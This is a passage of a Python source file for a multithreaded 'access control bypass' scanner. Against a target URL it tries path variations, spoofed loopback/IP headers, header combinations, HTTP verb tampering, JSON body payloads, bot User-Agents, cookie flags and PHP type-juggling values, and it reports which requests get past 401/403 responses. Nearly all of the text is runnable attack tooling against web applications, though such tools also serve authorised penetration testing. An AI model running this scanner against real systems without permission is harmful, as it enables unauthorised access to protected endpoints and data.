            print("[!] Could not establish baseline (differential detection reduced).")

    def is_interesting(self, status: int, length: int) -> bool:
        """Soft-signal detector: something changed for the better vs the blocked baseline."""
        if self.baseline_status is None:
            return False
        # A success-ish code that differs from the blocked baseline
        if status in self.INTERESTING_CODES and status != self.baseline_status:
            return True
        # Same status as baseline but body size shifted meaningfully (partial leak / different template)
        if status == self.baseline_status and self.baseline_length is not None:
            threshold = max(64, int(self.baseline_length * 0.30))
            if abs(length - self.baseline_length) > threshold:
                return True
        return False

    def _throttle(self):
        if self.delay:
            time.sleep(self.delay)

    # ------------------------------------------------------------------
    # NEW: centralised single-header probe. DRYs up all the header batteries
    # (IP-ENC / UA / Cookie / PHP-juggle / full sweep) into one code path.
    # ------------------------------------------------------------------
    def _try_headers(self, method: str, full_url: str, headers_list: List[Dict[str, str]],
                     category: str, value_label: str = "Header", timeout: int = 3) -> List[str]:
        found = []
        for header in headers_list:
            try:
                r = self.session.request(method, full_url, headers=header,
                                         timeout=timeout, allow_redirects=False)
                if r.status_code in (200, 201, 204):
                    k = list(header.keys())[0]
                    v = str(list(header.values())[0])
                    ln = len(r.content)
                    with self.lock:
                        print(f"  [!] {category}: {k}: {v[:60]} → {r.status_code} (Length: {ln})")
                    found.append(
                        f"{category}: {method} {full_url} | {value_label}: {k}: {v} | Length: {ln} | Status: {r.status_code}"
                    )
            except requests.exceptions.RequestException:
                continue
        return found

    def _apply_filters(self, results: List[str]) -> List[str]:
        """Apply --match-code / --filter-code / --filter-length across ALL findings."""
        if not (self.match_codes or self.filter_codes or self.filter_lengths):
            return results
        out = []
        for r in results:
            m = re.search(r"Status:\s*(\d+)", r)
            l = re.search(r"Length:\s*(\d+)", r)
            code = int(m.group(1)) if m else None
            length = int(l.group(1)) if l else None
            if self.match_codes and code not in self.match_codes:
                continue
            if self.filter_codes and code in self.filter_codes:
                continue
            if self.filter_lengths and length in self.filter_lengths:
                continue
            out.append(r)
        return out

    def test_request(self, method: str, path_var: str) -> List[str]:
        """Test a single path variation with all headers"""
        results = []
        full_url = self.base_url + path_var

        # Check if we've already tested this combination
        test_key = f"{method}:{path_var}"
        with self.lock:
            if test_key in self.tested_combinations:
                return results
            self.tested_combinations.add(test_key)

        try:
            self._throttle()
            # Baseline check
            res = self.session.request(method, full_url, timeout=self.timeout, allow_redirects=False)
            status = res.status_code
            length = len(res.content)

            # Print result (only if verbose or if successful)
            if self.verbose or status in [200, 201, 204]:
                with self.lock:
                    print(f"{method:<8} | {status:<5} | {length:<8} | {path_var[:80]}")

            # Filter out OPTIONS with 0 length (usually just CORS preflight, not a real bypass)
            if status in [200, 201, 204]:
                if not (method == "OPTIONS" and length == 0):
                    results.append(f"SUCCESS: {method} {full_url} | Length: {length} | Status: {status}")

            # NEW: differential detection (additive, softer signal than a hard 2xx)
            elif self.is_interesting(status, length):
                with self.lock:
                    print(f"  [~] DIFFERENTIAL: {method} {status} (Length: {length}, "
                          f"baseline {self.baseline_status}/{self.baseline_length}) | {path_var[:60]}")
                results.append(
                    f"DIFFERENTIAL: {method} {full_url} | Status: {status} | Length: {length} | "
                    f"Baseline: {self.baseline_status}/{self.baseline_length}"
                )

            # NEW: adaptive back-off when the target rate-limits us
            if status == 429:
                with self.lock:
                    self.rate_limit_hits += 1
                time.sleep(max(self.delay, 0.5))

            # Advanced bypass attempts on blocked requests
            if status in [401, 403, 405, 407, 429]:
                # Try single headers
                headers_to_test = self.get_headers()
                for header in headers_to_test[:self.max_headers]:  # breadth configurable via --max-headers
                    try:
                        h_res = self.session.request(
                            method, full_url, headers=header,
                            timeout=3, allow_redirects=False
                        )
                        if h_res.status_code in [200, 201, 204]:
                            h_name = list(header.keys())[0]
                            h_value = list(header.values())[0]
                            h_length = len(h_res.content)
                            with self.lock:
                                print(f"  [!] BYPASS: {h_name}: {h_value} → {h_res.status_code} (Length: {h_length})")
                            results.append(
                                f"HEADER BYPASS: {method} {full_url} | Header: {h_name}: {h_value} | Length: {h_length} | Status: {h_res.status_code}"
                            )
                    except requests.exceptions.RequestException:
                        continue

                # Try header combinations (more powerful)
                header_combos = self.get_header_combinations()
                for combo in header_combos:
                    try:
                        combo_res = self.session.request(
                            method, full_url, headers=combo,
                            timeout=3, allow_redirects=False
                        )
                        if combo_res.status_code in [200, 201, 204]:
                            combo_str = ", ".join([f"{k}: {v}" for k, v in combo.items()])
                            combo_length = len(combo_res.content)
                            with self.lock:
                                print(f"  [!!] COMBO BYPASS: {combo_str} → {combo_res.status_code} (Length: {combo_length})")
                            results.append(
                                f"COMBO BYPASS: {method} {full_url} | Headers: [{combo_str}] | Length: {combo_length} | Status: {combo_res.status_code}"
                            )
                    except requests.exceptions.RequestException:
                        continue

                # HTTP Verb Tampering - try alternative methods
                # This tests if different HTTP methods bypass access controls
                # Example: GET /admin returns 403, but HEAD /admin returns 200
                # Some WAFs/proxies only check certain methods (GET/POST) but not others
                if method in ["GET", "POST"]:
                    alternative_methods = ["PUT", "PATCH", "DELETE", "HEAD"]  # Removed OPTIONS
                    for alt_method in alternative_methods:
                        try:
                            alt_res = self.session.request(
                                alt_method, full_url, timeout=3, allow_redirects=False
                            )
                            alt_length = len(alt_res.content)

                            # Filter out HEAD with 0 length (expected behavior)
                            if alt_res.status_code in [200, 201, 204]:
                                if not (alt_method == "HEAD" and alt_length == 0):
                                    with self.lock:
                                        print(f"  [!] VERB TAMPERING: {method} → {alt_method} → {alt_res.status_code} (Length: {alt_length})")
                                    results.append(
                                        f"VERB TAMPERING: {full_url} | Original: {method} → New: {alt_method} | Length: {alt_length} | Status: {alt_res.status_code}"
                                    )
                        except requests.exceptions.RequestException:
                            continue

                # Body-based bypasses for POST/PUT/PATCH
                if method in ["POST", "PUT", "PATCH"]:
                    payloads = self.get_bypass_payloads()
                    for payload in payloads[:10]:  # Limit to avoid too many requests
                        try:
                            # JSON payload
                            body_res = self.session.request(
                                method, full_url,
                                json=payload,
                                headers={"Content-Type": "application/json"},
                                timeout=3,
                                allow_redirects=False
                            )
                            if body_res.status_code in [200, 201, 204]:
                                body_length = len(body_res.content)
                                with self.lock:
                                    print(f"  [!] BODY BYPASS: {payload} → {body_res.status_code} (Length: {body_length})")
                                results.append(
                                    f"BODY BYPASS: {method} {full_url} | Payload: {payload} | Length: {body_length} | Status: {body_res.status_code}"
                                )
                        except requests.exceptions.RequestException:
                            continue

                # ==========================================================
                # ==========  NEW EXTENDED BATTERIES (ADDITIVE)  ===========
                # These are large, so by default they only run against the
                # canonical protected path (they are not path-dependent).
                # Use --deep to run them against every path variation.
                # ==========================================================
                if self.deep or path_var == self.canonical_path:
                    # 1) Extended IP-spoof headers (every loopback representation)
                    results.extend(self._try_headers(
                        method, full_url, self.get_extended_ip_headers(), "IP-ENC BYPASS"))

                    # 2) User-Agent bypasses (bot / health-check UAs)
                    results.extend(self._try_headers(
                        method, full_url, self.get_user_agent_headers(), "UA BYPASS",
                        value_label="User-Agent"))

                    # 3) Cookie flag bypasses
                    results.extend(self._try_headers(
                        method, full_url, self.get_cookie_headers(), "COOKIE BYPASS",
                        value_label="Cookie"))

                    # 4) NEW: PHP type-juggling cookies/tokens (magic-hash 0e, preimages, arrays)
                    results.extend(self._try_headers(
                        method, full_url, self.get_php_juggling_headers(), "PHP-JUGGLE BYPASS",
                        value_label="Cookie"))

                    # 5) NEW: full header sweep — covers the headers the main loop skipped
                    #    because of the --max-headers cap (so newly-added headers are tested).
                    tail = self.get_headers()[self.max_headers:]
                    if tail:
                        results.extend(self._try_headers(
                            method, full_url, tail, "HEADER BYPASS"))

        except requests.exceptions.RequestException as e:
            pass

        return results

    def run(self):
        """Execute tests with thread pool"""
        print(f"[*] Target: {self.base_url}{self.path}")
        print(f"[*] Threads: {self.threads}")

        # NEW: fingerprint the blocked response first
        self.establish_baseline()

        path_variations = self.get_path_variations()
        print(f"[*] Testing {len(path_variations)} path variations × {len(self.methods)} methods")
        if self.deep:
            print("[*] DEEP mode: extended header batteries run against EVERY path variation.")

        if self.custom_headers:
            print(f"[*] Custom headers: {len(self.custom_headers)}")
            for h in self.custom_headers:
                print(f"    - {list(h.keys())[0]}: {list(h.values())[0]}")

        print("-" * 100)
        print(f"{'METHOD':<8} | {'CODE':<5} | {'LENGTH':<8} | PATH")
        print("-" * 100)

        # Create task list
        tasks = [(method, path_var) for method in self.methods for path_var in path_variations]

        # Execute with thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_task = {
                executor.submit(self.test_request, method, path_var): (method, path_var)
                for method, path_var in tasks
            }

            completed = 0
            total_tasks = len(future_to_task)
            for future in as_completed(future_to_task):
                try:
                    results = future.result()
                    if results:
                        with self.lock:
                            self.successes.extend(results)
                except Exception as e:
                    pass
                completed += 1
                if completed % 500 == 0:
                    # progress on stderr so it never pollutes result parsing / -o output
                    print(f"[*] Progress: {completed}/{total_tasks} tasks", file=sys.stderr)

        if self.rate_limit_hits:
            print(f"[!] Target returned 429 {self.rate_limit_hits} time(s). "
                  f"Consider lowering -t and/or raising --delay for cleaner results.",
                  file=sys.stderr)

    def print_summary(self):
        """Print final results"""
        print("\n" + "=" * 120)
        print(" " * 50 + "BYPASS SUMMARY")
        print("=" * 120)

        # NEW: apply match/filter rules before anything is reported
        filtered = self._apply_filters(sorted(set(self.successes)))

        if not filtered:
            print("[-] No bypasses found. Access controls are properly configured.")
        else:
            unique_results = filtered

            # Categorize results
            success_bypasses = [r for r in unique_results if r.startswith("SUCCESS:")]
            header_bypasses = [r for r in unique_results if r.startswith("HEADER BYPASS:")]
            combo_bypasses = [r for r in unique_results if r.startswith("COMBO BYPASS:")]
            verb_bypasses = [r for r in unique_results if r.startswith("VERB TAMPERING:")]
            body_bypasses = [r for r in unique_results if r.startswith("BODY BYPASS:")]
            # NEW categories
            ipenc_bypasses = [r for r in unique_results if r.startswith("IP-ENC BYPASS:")]
            ua_bypasses = [r for r in unique_results if r.startswith("UA BYPASS:")]
            cookie_bypasses = [r for r in unique_results if r.startswith("COOKIE BYPASS:")]
            php_bypasses = [r for r in unique_results if r.startswith("PHP-JUGGLE BYPASS:")]
            diff_bypasses = [r for r in unique_results if r.startswith("DIFFERENTIAL:")]

            total = len(unique_results)
            print(f"[+] Found {total} potential bypass(es)!\n")

            def _print_block(title, items):
                if not items:
                    return
                print(f"{title} ({len(items)}):")
                print("-" * 120)
                for i, report in enumerate(items, 1):
                    parts = report.split(" | ")
                    print(f"  {i}. {parts[0]}")
                    for part in parts[1:]:
                        print(f"      → {part}")
                print()

            _print_block("🎯 DIRECT ACCESS BYPASSES", success_bypasses)
            _print_block("📋 HEADER-BASED BYPASSES", header_bypasses)
            _print_block("🔥 MULTI-HEADER COMBO BYPASSES", combo_bypasses)
            _print_block("⚡ HTTP VERB TAMPERING BYPASSES", verb_bypasses)
            _print_block("💉 BODY PAYLOAD BYPASSES", body_bypasses)
            # NEW blocks
            _print_block("🌐 IP-ENCODING / LOOPBACK BYPASSES", ipenc_bypasses)
            _print_block("🤖 USER-AGENT BYPASSES", ua_bypasses)
            _print_block("🍪 COOKIE-FLAG BYPASSES", cookie_bypasses)
            _print_block("🎲 PHP TYPE-JUGGLING BYPASSES", php_bypasses)
            _print_block("🔍 DIFFERENTIAL (SOFT-SIGNAL) HITS", diff_bypasses)

        print("=" * 120)

    # ------------------------------------------------------------------
    # NEW: persist findings for reporting (JSON or plain text).
    # ------------------------------------------------------------------
    def save_results(self, out_path: str):
        findings = self._apply_filters(sorted(set(self.successes)))
        if out_path.lower().endswith(".json"):
            data = {
                "target": self.base_url + self.path,
                "baseline": {"status": self.baseline_status, "length": self.baseline_length},
                "total_findings": len(findings),
                "findings": findings,
            }
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        else:
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(f"# Target: {self.base_url}{self.path}\n")
                f.write(f"# Baseline: {self.baseline_status} / {self.baseline_length}\n")
                f.write(f"# Total findings: {len(findings)}\n\n")
                for line in findings:
                    f.write(line + "\n")
        print(f"[*] Results saved to {out_path}")


def main():
    parser = argparse.ArgumentParser(
        description="Advanced Access Control Bypass Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u https://api.example.com/admin
  %(prog)s -u https://example.com/api/v1/users -t 20
  %(prog)s -u https://example.com/admin -H "Authorization: Bearer token123"
  %(prog)s -u https://example.com/api -H "X-API-Key: secret" -H "X-Custom: value"
  %(prog)s -u https://example.com/admin -x http://127.0.0.1:8080 -o results.json
  %(prog)s -u https://example.com/admin --deep --delay 0.1
        """
    )

    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target URL to test (e.g., https://example.com/admin)"
    )

    parser.add_argument(
        "-H", "--header",
        action="append",
        dest="headers",
        help="Custom header to include in tests (format: 'Key: Value'). Can be used multiple times."
    )

    parser.add_argument(
        "-t", "--threads",
        type=int,
        default=10,
        help="Number of concurrent threads (default: 10)"
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="Request timeout in seconds (default: 5)"
    )

    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output - show all requests"
    )

    # NEW options
    parser.add_argument(
        "-x", "--proxy",
        help="Route all traffic through a proxy, e.g. http://127.0.0.1:8080 (Burp/ZAP)."
    )
    parser.add_argument(
        "-o", "--output",
        help="Save findings to a file (.json for structured, anything else for plain text)."
    )
    parser.add_argument(
        "--user-agent",
        help="Set a global default User-Agent for baseline requests."
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Per-request delay in seconds to throttle the scan (default: 0)."
    )
    parser.add_argument(
        "--deep",
        action="store_true",
        help="Run the extended header batteries (IP-encoding, UA, cookie, PHP-juggle) against "
             "EVERY path variation, not just the canonical path. Much slower, more thorough."
    )
    parser.add_argument(
        "--max-headers",
        type=int,
        default=30,
        help="How many single headers to test per blocked path variation (default: 30). "
             "The full set is always swept against the canonical path regardless."
    )
    parser.add_argument(
        "--match-code",
        help="Only report hits with these status codes (comma-separated, e.g. 200,302)."
    )
    parser.add_argument(
        "--filter-code",
        help="Drop hits with these status codes (comma-separated)."
    )
    parser.add_argument(
        "--filter-length",
        help="Drop hits whose response body length matches these values (comma-separated). "
             "Handy for suppressing a generic catch-all page."
    )

    args = parser.parse_args()

    def _parse_int_set(val):
        if not val:
            return set()
        out = set()
        for chunk in val.split(","):
            chunk = chunk.strip()
            if chunk.isdigit():
                out.add(int(chunk))
        return out

    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print("[!] Error: URL must start with http:// or https://")
        sys.exit(1)

    print("\n" + "=" * 100)
    print(" " * 25 + "ACCESS CONTROL BYPASS TESTER")
    print("=" * 100 + "\n")

    auditor = UltimateBypasser(
        args.url,
        args.headers,
        args.threads,
        args.timeout,
        args.verbose,
        proxy=args.proxy,
        user_agent=args.user_agent,
        delay=args.delay,
        deep=args.deep,
        max_headers=args.max_headers,
        match_codes=_parse_int_set(args.match_code),
        filter_codes=_parse_int_set(args.filter_code),
        filter_lengths=_parse_int_set(args.filter_length),
    )
    auditor.run()
    auditor.print_summary()

    if args.output:
        auditor.save_results(args.output)


if __name__ == "__main__":
    main()
